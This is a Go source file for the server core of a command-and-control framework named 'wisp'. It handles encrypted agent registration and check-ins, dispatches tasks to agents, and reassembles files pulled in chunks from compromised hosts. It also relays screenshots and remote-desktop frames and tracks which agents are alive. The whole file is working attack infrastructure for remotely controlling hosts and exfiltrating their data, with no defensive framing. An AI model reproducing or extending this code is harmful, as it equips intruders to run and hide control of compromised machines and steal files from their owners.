package server

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/user/wisp/internal/db"
	"github.com/user/wisp/shared/protocol"
)

// EventEmitter is a callback interface for pushing events to the frontend.
type EventEmitter interface {
	EmitEvent(name string, data ...any)
}

// Listener is the interface implemented by all protocol listeners (TCP, HTTP, ...).
type Listener interface {
	ID() string
	Config() *db.ListenerRow
	Start() error
	Stop()
	IsRunning() bool
}

// Server is the core C2 server engine managing listeners, sessions, and tasks.
type Server struct {
	mu        sync.RWMutex
	db        *db.Database
	emitter   EventEmitter
	listeners map[string]Listener
	sessions  map[string]*AgentSession
	downloads map[string]*downloadState
	limiter   *rateLimiter
	rsaKey    *rsa.PrivateKey
	rsaPubPEM []byte
	running   bool
	stopCh    chan struct{}

	tlsFpOnce sync.Once
	tlsFp     string

	rcp *RCPListener // remote control long-lived channel
}

// AgentSession holds the runtime state for a connected agent.
type AgentSession struct {
	Info     *db.SessionRow
	Keys     *protocol.SessionKeys
	TaskCh   chan *db.TaskRow
	LastSeen time.Time

	seqMu   sync.Mutex
	lastSeq uint64 // highest checkin sequence seen (replay protection)
}

// downloadBlock mirrors the agent-side chunk structure for downloaded files.
type downloadBlock struct {
	Index    int    `json:"index"`
	Total    int    `json:"total"`
	Filename string `json:"filename"`
	Data     string `json:"data"` // base64 encoded raw bytes
}

// downloadTimeout abandons a download whose chunks never complete (agent died
// mid-transfer) so stale aggregation state does not leak forever.
const downloadTimeout = 10 * time.Minute

// downloadState aggregates the chunks of an in-progress agent->server download.
type downloadState struct {
	mu       sync.Mutex
	taskID   string
	filename string
	total    int
	blocks   map[int][]byte
	savePath string
	created  time.Time
}

// New creates a new Server instance.
func New(database *db.Database, emitter EventEmitter) (*Server, error) {
	// Load or generate the RSA key pair. Persisting it keeps agents connected
	// across server restarts (their session keys were wrapped with this key).
	rsaPath := filepath.Join(database.DataDir(), "server_rsa.pem")
	privKey, pubPEM, err := protocol.LoadOrGenerateRSAKeyPair(rsaPath)
	if err != nil {
		return nil, fmt.Errorf("load RSA keys: %w", err)
	}

	s := &Server{
		db:        database,
		emitter:   emitter,
		listeners: make(map[string]Listener),
		sessions:  make(map[string]*AgentSession),
		downloads: make(map[string]*downloadState),
		limiter:   newRateLimiter(defaultMaxPerIP, defaultWindow, defaultGlobalMax),
		rsaKey:    privKey,
		rsaPubPEM: pubPEM,
		stopCh:    make(chan struct{}),
	}
	s.rcp = newRCPListener(s)
	return s, nil
}

// allowConn checks whether a new connection from ip is allowed by the limiter.
func (s *Server) allowConn(ip string) bool {
	return s.limiter.allow(ip)
}

// TLSFingerprint returns the SHA-256 fingerprint (hex) of the server's TLS
// certificate, used to pin the certificate in agents.
//
// It first makes sure the persistent certificate exists: generating a payload
// for an HTTPS listener is a legitimate moment to create the cert, even if the
// listener itself has not been started yet. Previously the fingerprint was only
// computed when the file happened to exist, which could leave payloads with an
// empty (or worse, stale) pin after the cert was generated later — a classic
// "HTTPS listener works but agents never come online" failure.
func (s *Server) TLSFingerprint() string {
	s.tlsFpOnce.Do(func() {
		if _, err := s.loadOrGenerateTLSCert(); err == nil {
			certPath := filepath.Join(s.db.DataDir(), "tls", "cert.pem")
			if data, err := os.ReadFile(certPath); err == nil {
				if block, _ := pem.Decode(data); block != nil {
					sum := sha256.Sum256(block.Bytes)
					s.tlsFp = hex.EncodeToString(sum[:])
				}
			}
		}
	})
	return s.tlsFp
}

// releaseConn decrements the active connection count.
func (s *Server) releaseConn() {
	s.limiter.release()
}

// RegisterDownload prepares aggregation state for a download task whose chunks
// will be reported over several checkins. savePath is where the file is written
// once all chunks have arrived.
func (s *Server) RegisterDownload(taskID, savePath string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.downloads == nil {
		s.downloads = make(map[string]*downloadState)
	}
	s.downloads[taskID] = &downloadState{
		taskID:   taskID,
		savePath: savePath,
		blocks:   make(map[int][]byte),
		created:  time.Now(),
	}
}

// cleanupDownloads fails downloads that have been stuck longer than the timeout.
func (s *Server) cleanupDownloads() {
	deadline := time.Now().Add(-downloadTimeout)

	s.mu.Lock()
	var expired []string
	for id, st := range s.downloads {
		if st.created.Before(deadline) {
			expired = append(expired, id)
		}
	}
	s.mu.Unlock()

	for _, id := range expired {
		if st, ok := s.getDownload(id); ok {
			s.failDownload(st, "timed out waiting for chunks")
		}
	}
}

// getDownload returns the aggregation state for a download task, if any.
func (s *Server) getDownload(taskID string) (*downloadState, bool) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	state, ok := s.downloads[taskID]
	return state, ok
}

// removeDownload clears the aggregation state for a finished download task.
func (s *Server) removeDownload(taskID string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	delete(s.downloads, taskID)
}

// acceptSeq implements the replay-protection window: it accepts seq only if it
// is strictly greater than the last accepted sequence (agents check in once per
// sleep interval from a single goroutine, so strict ordering holds).
func (as *AgentSession) acceptSeq(seq uint64) bool {
	if seq == 0 {
		return false
	}
	as.seqMu.Lock()
	defer as.seqMu.Unlock()
	if as.lastSeq != 0 && seq <= as.lastSeq {
		return false
	}
	as.lastSeq = seq
	return true
}

// Start begins the server background processes (session health checker).
func (s *Server) Start() error {
	s.mu.Lock()
	defer s.mu.Unlock()

	if s.running {
		return nil
	}

	s.running = true
	s.stopCh = make(chan struct{})

	// Start session health check goroutine
	go s.sessionHealthCheck()

	// Restore previously running listeners
	go s.restoreListeners()

	log.Println("[Server] Started")
	return nil
}

// Stop shuts down all listeners and background processes.
func (s *Server) Stop() {
	s.mu.Lock()
	defer s.mu.Unlock()

	if !s.running {
		return
	}

	s.running = false
	close(s.stopCh)

	// Stop the remote-control channel
	s.rcp.Stop()

	// Stop all listeners
	for id, l := range s.listeners {
		l.Stop()
		_ = s.db.UpdateListenerStatus(id, protocol.ListenerStopped)
	}

	log.Println("[Server] Stopped")
}

// GetRSAPublicKeyPEM returns the server's RSA public key in PEM format.
func (s *Server) GetRSAPublicKeyPEM() []byte {
	return s.rsaPubPEM
}

// GetRSAPrivateKey returns the server's RSA private key.
func (s *Server) GetRSAPrivateKey() *rsa.PrivateKey {
	return s.rsaKey
}

// GetTLSCertificate returns the persistent self-signed TLS certificate used by
// HTTPS endpoints (file server etc.). Persisted under data/tls so the
// fingerprint stays stable across restarts.
func (s *Server) GetTLSCertificate() (tls.Certificate, error) {
	return s.loadOrGenerateTLSCert()
}

// EnsureRCP starts the remote-control channel listener for the given transport
// ("tcp" or "kcp") and returns its port. A running listener with a different
// transport is restarted automatically.
func (s *Server) EnsureRCP(proto string) (int, error) {
	return s.rcp.Ensure(proto)
}

// SendRCPInput forwards an input event to the agent's RCP channel.
func (s *Server) SendRCPInput(sessionID string, msg []byte) error {
	return s.rcp.SendInput(sessionID, msg)
}

// CloseRCPChannel closes the agent's RCP channel.
func (s *Server) CloseRCPChannel(sessionID string) {
	s.rcp.CloseChannel(sessionID)
}

// StopRCP shuts the RCP listener down.
func (s *Server) StopRCP() {
	s.rcp.Stop()
}

// RegisterSession registers a new agent session.
func (s *Server) RegisterSession(sess *db.SessionRow, keys *protocol.SessionKeys) {
	s.mu.Lock()
	defer s.mu.Unlock()

	as := &AgentSession{
		Info:     sess,
		Keys:     keys,
		TaskCh:   make(chan *db.TaskRow, 100),
		LastSeen: time.Now(),
	}
	s.sessions[sess.ID] = as

	// Persist to database
	_ = s.db.CreateSession(sess)

	// Emit event to frontend
	if s.emitter != nil {
		s.emitter.EmitEvent("session:new", sess)
	}

	log.Printf("[Server] New session: %s (%s@%s)", sess.ID, sess.Username, sess.Hostname)
}

// UpdateSessionCheckin updates the last seen time for a session.
func (s *Server) UpdateSessionCheckin(sessionID string) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if as, ok := s.sessions[sessionID]; ok {
		as.LastSeen = time.Now()
		as.Info.LastSeen = as.LastSeen
		_ = s.db.UpdateSessionLastSeen(sessionID, as.LastSeen)
	}
}

// GetSession returns a session by ID.
func (s *Server) GetSession(id string) *AgentSession {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.sessions[id]
}

// RemoveSession drops a session from the in-memory registry.
func (s *Server) RemoveSession(id string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	delete(s.sessions, id)
}

// MarkSessionDead immediately marks a session dead in memory and in the
// database and notifies the frontend. Used when the agent reports it terminated
// itself, so the UI reacts without waiting for the health-check timeout.
func (s *Server) MarkSessionDead(sessionID string) {
	s.mu.Lock()
	if as := s.sessions[sessionID]; as != nil {
		as.Info.Status = protocol.StatusDead
	}
	s.mu.Unlock()
	_ = s.db.UpdateSessionStatus(sessionID, protocol.StatusDead)
	if s.emitter != nil {
		s.emitter.EmitEvent("session:dead", sessionID)
	}
	log.Printf("[Server] Session marked dead (agent terminated): %s", sessionID)
}

// GetPendingTasks retrieves pending tasks for a session and marks them as sent.
func (s *Server) GetPendingTasks(sessionID string) ([]db.TaskRow, error) {
	tasks, err := s.db.GetPendingTasks(sessionID)
	if err != nil {
		return nil, err
	}

	if len(tasks) > 0 {
		ids := make([]string, len(tasks))
		for i, t := range tasks {
			ids[i] = t.ID
		}
		_ = s.db.MarkTasksSent(ids)
	}

	return tasks, nil
}

// rdpFrameStatus is the Result status used for remote-desktop screen frames.
// Frames reference a synthetic task id ("rdp:<session>") and are forwarded to
// the frontend without being persisted.
const rdpFrameStatus = "rdpframe"

// CompleteTask stores a task result.
func (s *Server) CompleteTask(taskID, result, status string) {
	// Screen frames of a remote desktop stream are relayed to the frontend
	// without touching the database.
	if status == rdpFrameStatus {
		if sessionID := strings.TrimPrefix(taskID, "rdp:"); sessionID != taskID {
			if s.emitter != nil {
				s.emitter.EmitEvent("rdp:frame", map[string]string{
					"session_id": sessionID,
					"frame":      result,
				})
			}
		}
		return
	}

	// Download chunks are aggregated before the task is marked complete
	if state, ok := s.getDownload(taskID); ok && status == protocol.TaskDownloading {
		s.handleDownloadChunk(state, result, taskID)
		return
	}

	_ = s.db.CompleteTask(taskID, result, status)

	// Audit log: persist the result for the session's console history
	if task, err := s.db.GetTask(taskID); err == nil {
		// A sleep change must be reflected in the session record (UI display and
		// dead-session detection both rely on the stored interval), otherwise the
		// command looks like it did nothing.
		if task.CommandID == int(protocol.CmdSleep) {
			if sleep, jitter, ok := parseSleepResult(result); ok {
				_ = s.db.UpdateSessionSleep(task.SessionID, sleep, jitter)
				if as := s.GetSession(task.SessionID); as != nil {
					as.Info.SleepInterval = sleep
					as.Info.Jitter = jitter
				}
			}
		}

		// The agent reported that it terminated itself: mark the session dead
		// immediately so the UI reacts instead of waiting for the health-check
		// timeout (min 30s).
		if task.CommandID == int(protocol.CmdClientKill) && status == protocol.TaskCompleted {
			s.MarkSessionDead(task.SessionID)
		}

		// Screenshot payloads are base64 JPEG — they must never flood the
		// console or the log. The frontend consumes them through the dedicated
		// TakeScreenshot/GetScreenshot flow instead.
		if task.CommandID == int(protocol.CmdScreenshot) {
			return
		}

		// Format the status tag and the command output on separate lines so the
		// reply is easy to read instead of sharing one line with the tag:
		//
		//   [completed]
		//   'ls' 不是内部或外部命令...
		_ = s.db.InsertConsoleLog(task.SessionID, "output", "["+status+"]\n"+result)

		// The last chunk of an upload carries a completion marker; refresh the
		// transfer record so the Download Center shows a finished state.
		if status == protocol.TaskCompleted && strings.HasPrefix(result, "upload complete:") {
			_ = s.db.CompleteLatestUpload(task.SessionID)
		}

		if s.emitter != nil {
			s.emitter.EmitEvent("session:output", map[string]string{
				"session_id": task.SessionID,
				"task_id":    taskID,
				"result":     result,
				"status":     status,
			})
		}
	}
}

// sleepResultRe matches the agent's sleep command output, e.g.
// "sleep=10000ms (10.00s) jitter=10%".
var sleepResultRe = regexp.MustCompile(`sleep=(\d+)ms.*jitter=(\d+)%`)

// parseSleepResult extracts sleep (ms) and jitter (%) from an agent's sleep
// command result. Returns ok=false when the result does not look like a sleep
// acknowledgment.
func parseSleepResult(result string) (int, int, bool) {
	m := sleepResultRe.FindStringSubmatch(result)
	if m == nil {
		return 0, 0, false
	}
	sleep, err1 := strconv.Atoi(m[1])
	jitter, err2 := strconv.Atoi(m[2])
	if err1 != nil || err2 != nil {
		return 0, 0, false
	}
	return sleep, jitter, true
}

// handleDownloadChunk stores one chunk and writes the file when all chunks have
// arrived.
func (s *Server) handleDownloadChunk(state *downloadState, blockJSON, taskID string) {
	var blk downloadBlock
	if err := json.Unmarshal([]byte(blockJSON), &blk); err != nil {
		s.failDownload(state, "invalid download chunk: "+err.Error())
		return
	}

	data, err := base64.StdEncoding.DecodeString(blk.Data)
	if err != nil {
		s.failDownload(state, "invalid chunk encoding: "+err.Error())
		return
	}

	state.mu.Lock()
	state.total = blk.Total
	if blk.Filename != "" {
		state.filename = blk.Filename
	}
	state.blocks[blk.Index] = data
	complete := state.total > 0 && len(state.blocks) >= state.total
	state.mu.Unlock()

	if !complete {
		return // waiting for the remaining chunks
	}

	// Reassemble in index order
	var buf bytes.Buffer
	for i := 0; i < state.total; i++ {
		b, ok := state.blocks[i]
		if !ok {
			s.failDownload(state, fmt.Sprintf("missing chunk %d of %d", i, state.total))
			return
		}
		buf.Write(b)
	}

	if err := os.MkdirAll(filepath.Dir(state.savePath), 0755); err != nil {
		s.failDownload(state, "mkdir: "+err.Error())
		return
	}
	if err := os.WriteFile(state.savePath, buf.Bytes(), 0644); err != nil {
		s.failDownload(state, "write file: "+err.Error())
		return
	}

	s.removeDownload(taskID)
	_ = s.db.CompleteTask(taskID, fmt.Sprintf("downloaded %d bytes to %s", buf.Len(), state.savePath), protocol.TaskCompleted)
	_ = s.db.UpdateFileTransferByTask(taskID, "completed", int64(buf.Len()))
	if s.emitter != nil {
		s.emitter.EmitEvent("session:download-complete", map[string]string{
			"task_id":  taskID,
			"filename": state.filename,
			"path":     state.savePath,
			"size":     fmt.Sprintf("%d", buf.Len()),
		})
	}
	log.Printf("[Server] Download complete: %s (%d bytes) -> %s", taskID, buf.Len(), state.savePath)
}

// failDownload marks a download task as failed and clears its state.
func (s *Server) failDownload(state *downloadState, reason string) {
	s.removeDownload(state.taskID)
	_ = s.db.CompleteTask(state.taskID, "download failed: "+reason, protocol.TaskFailed)
	if s.emitter != nil {
		s.emitter.EmitEvent("session:download-complete", map[string]string{
			"task_id": state.taskID,
			"status":  protocol.TaskFailed,
			"error":   reason,
		})
	}
	log.Printf("[Server] Download failed: %s (%s)", state.taskID, reason)
}

// createListener builds a protocol listener from its persisted configuration.
func (s *Server) createListener(config *db.ListenerRow) (Listener, error) {
	switch config.Protocol {
	case protocol.ProtocolHTTP, protocol.ProtocolHTTPS:
		return newHTTPListener(s, config), nil
	case protocol.ProtocolTCP:
		return newTCPListener(s, config), nil
	case protocol.ProtocolKCP:
		return newKCPListener(s, config), nil
	default:
		return nil, fmt.Errorf("unsupported listener protocol: %s", config.Protocol)
	}
}

// processRegistration handles a hybrid-encrypted registration payload shared by
// all protocol listeners. It returns the session keys and the encrypted ACK payload.
func (s *Server) processRegistration(encPayload []byte, listenerID, remoteIP string) (*protocol.SessionKeys, []byte, error) {
	// Hybrid decryption: payload = [4 bytes key_len][RSA encrypted keys][AES encrypted reg data]
	if len(encPayload) < 4 {
		return nil, nil, fmt.Errorf("registration payload too short")
	}

	keyLen := binary.LittleEndian.Uint32(encPayload[0:4])
	if uint32(len(encPayload)) < 4+keyLen {
		return nil, nil, fmt.Errorf("invalid registration payload length")
	}
	encryptedKeys := encPayload[4 : 4+keyLen]
	encryptedReg := encPayload[4+keyLen:]

	// Step 1: RSA-decrypt the session keys
	keyMaterial, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, s.GetRSAPrivateKey(), encryptedKeys, nil)
	if err != nil {
		return nil, nil, fmt.Errorf("RSA decrypt keys failed: %w", err)
	}
	if len(keyMaterial) != 64 {
		return nil, nil, fmt.Errorf("invalid key material length: %d", len(keyMaterial))
	}

	keys := &protocol.SessionKeys{
		AESKey:  keyMaterial[:32],
		HMACKey: keyMaterial[32:],
	}

	// Step 2: AES-decrypt the registration data
	plaintext, err := keys.Decrypt(encryptedReg)
	if err != nil {
		return nil, nil, fmt.Errorf("AES decrypt registration failed: %w", err)
	}

	var reg RegistrationPayload
	if err := json.Unmarshal(plaintext, &reg); err != nil {
		return nil, nil, fmt.Errorf("unmarshal registration failed: %w", err)
	}

	// Enforce the 8-byte wire ID format (16 hex chars). The checkin path and RCP
	// handshake both slice exactly 8 bytes from the ID; accepting anything else
	// would register a session that can never check in (an endless
	// register → unknown-agent → re-register loop).
	if len(reg.ID) != 16 {
		return nil, nil, fmt.Errorf("registration rejected: invalid agent id length %d (must be 16 hex chars)", len(reg.ID))
	}
	for _, c := range reg.ID {
		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
			return nil, nil, fmt.Errorf("registration rejected: agent id must be hex")
		}
	}

	// PSK authentication: if the listener requires a pre-shared key, the agent
	// must present the same key in its (AES-encrypted) registration payload.
	if listener, err := s.db.GetListener(listenerID); err == nil && listener.PSK != "" {
		if reg.PSK == "" || reg.PSK != listener.PSK {
			return nil, nil, fmt.Errorf("registration rejected: invalid PSK")
		}
	}

	// Assign a stable sequence number. Agents re-register after server
	// restarts, so a re-registration keeps its existing number; brand-new
	// sessions get the next value from the monotonic counter (never reused).
	seq := 0
	if existing, err := s.db.GetSession(reg.ID); err == nil && existing != nil {
		seq = existing.Seq
	} else {
		if n, err := s.db.NextSessionSeq(); err == nil {
			seq = n
		} else {
			log.Printf("[Server] assign session seq: %v", err)
		}
	}

	// Create session
	now := time.Now()
	// Carry the listener protocol so the session's transport (tcp/kcp/http/
	// https) is visible in the UI immediately after registration.
	proto := ""
	if ln, err := s.db.GetListener(listenerID); err == nil {
		proto = ln.Protocol
	}

	sess := &db.SessionRow{
		ID:            reg.ID,
		Seq:           seq,
		ListenerID:    listenerID,
		Protocol:      proto,
		ExternalIP:    remoteIP,
		InternalIP:    reg.InternalIP,
		Hostname:      reg.Hostname,
		Username:      reg.Username,
		Domain:        reg.Domain,
		OS:            reg.OS,
		Arch:          reg.Arch,
		PID:           reg.PID,
		ProcessName:   reg.ProcessName,
		IsElevated:    reg.IsElevated,
		SleepInterval: reg.Sleep,
		Jitter:        reg.Jitter,
		FirstSeen:     now,
		LastSeen:      now,
		Status:        protocol.StatusAlive,
	}

	s.RegisterSession(sess, keys)

	// Build encrypted ACK
	ackPayload, _ := json.Marshal(map[string]string{"status": "ok", "id": reg.ID})
	encrypted, err := keys.Encrypt(ackPayload)
	if err != nil {
		return nil, nil, fmt.Errorf("encrypt ACK failed: %w", err)
	}
	return keys, encrypted, nil
}

// processCheckin handles a checkin body shared by all protocol listeners.
// It applies task results and returns the encrypted pending tasks for the agent.
// seq is a monotonically increasing per-session counter; sequences equal to or
// lower than the last accepted one are rejected as replays.
func (s *Server) processCheckin(agentID string, seq uint64, encryptedBody []byte) ([]byte, error) {
	as := s.GetSession(agentID)
	if as == nil {
		return nil, fmt.Errorf("unknown agent checkin: %s", agentID)
	}

	if !as.acceptSeq(seq) {
		return nil, fmt.Errorf("replay or out-of-order checkin rejected (seq %d)", seq)
	}

	// Decrypt the body (may contain task results)
	if len(encryptedBody) > 0 {
		body, err := as.Keys.Decrypt(encryptedBody)
		if err != nil {
			return nil, fmt.Errorf("decrypt checkin body failed: %w", err)
		}

		var results []TaskResult
		if len(body) > 0 {
			if err := json.Unmarshal(body, &results); err != nil {
				log.Printf("[Server] Failed to parse checkin results for %s: %v", agentID, err)
			}
			for _, r := range results {
				s.CompleteTask(r.TaskID, r.Output, r.Status)
			}
		}
	}

	// Update checkin time
	s.UpdateSessionCheckin(agentID)

	// Get pending tasks for this agent
	tasks, err := s.GetPendingTasks(agentID)
	if err != nil {
		return nil, fmt.Errorf("get tasks failed: %w", err)
	}

	var tasksPayload []byte
	if len(tasks) > 0 {
		tasksPayload, _ = json.Marshal(tasks)
	} else {
		tasksPayload = []byte("[]")
	}

	encrypted, err := as.Keys.Encrypt(tasksPayload)
	if err != nil {
		return nil, fmt.Errorf("encrypt tasks failed: %w", err)
	}
	return encrypted, nil
}

// restoreListeners re-starts any listeners that were running before shutdown.
func (s *Server) restoreListeners() {
	listeners, err := s.db.ListListeners()
	if err != nil {
		log.Printf("[Server] Failed to list listeners for restore: %v", err)
		return
	}
	for _, l := range listeners {
		if l.Status == protocol.ListenerRunning {
			_ = s.db.UpdateListenerStatus(l.ID, protocol.ListenerStopped)
			if err := s.StartListener(l.ID); err != nil {
				log.Printf("[Server] Failed to restore listener %s: %v", l.Name, err)
			} else {
				log.Printf("[Server] Restored listener %s on %s:%d", l.Name, l.BindHost, l.BindPort)
			}
		}
	}
}

// sessionHealthCheck periodically checks for dead sessions.
// The database is the source of truth: sessions are scanned from storage so
// that entries that are not in memory (e.g. left over from a previous run)
// are still marked as dead when their agent stops checking in.
func (s *Server) sessionHealthCheck() {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-s.stopCh:
			return
		case <-ticker.C:
			s.checkDeadSessions()
			s.cleanupDownloads()
		}
	}
}

// checkDeadSessions scans all alive sessions in the database and marks those
// whose last checkin is older than the timeout as dead. DB writes and events
// are performed outside the sessions lock so a slow disk / broadcast cannot
// stall the hot checkin path.
func (s *Server) checkDeadSessions() {
	alive, err := s.db.ListSessions(protocol.StatusAlive)
	if err != nil {
		log.Printf("[Server] Failed to list alive sessions: %v", err)
		return
	}

	now := time.Now()

	// Pass 1 (short lock, no IO): decide which sessions are dead and sync the
	// in-memory registry.
	var toMark []string
	s.mu.Lock()
	for i := range alive {
		row := &alive[i]

		lastSeen := row.LastSeen
		sleepInterval := row.SleepInterval

		// Prefer in-memory state when the session is currently tracked
		if as, ok := s.sessions[row.ID]; ok {
			lastSeen = as.LastSeen
			if as.Info.SleepInterval > 0 {
				sleepInterval = as.Info.SleepInterval
			}
			// Skip sessions already marked dead in memory
			if as.Info.Status != protocol.StatusAlive {
				continue
			}
		}

		// Mark as dead if no checkin for 3x sleep interval
		timeout := time.Duration(sleepInterval*3) * time.Millisecond
		if timeout < 30*time.Second {
			timeout = 30 * time.Second
		}

		if now.Sub(lastSeen) <= timeout {
			continue
		}

		// Sync in-memory state if present
		if as, ok := s.sessions[row.ID]; ok {
			as.Info.Status = protocol.StatusDead
		}
		toMark = append(toMark, row.ID)
	}
	s.mu.Unlock()

	// Pass 2 (lock free): persist and notify.
	for _, id := range toMark {
		_ = s.db.UpdateSessionStatus(id, protocol.StatusDead)
		if s.emitter != nil {
			s.emitter.EmitEvent("session:dead", id)
		}
		log.Printf("[Server] Session dead: %s", id)
	}
}
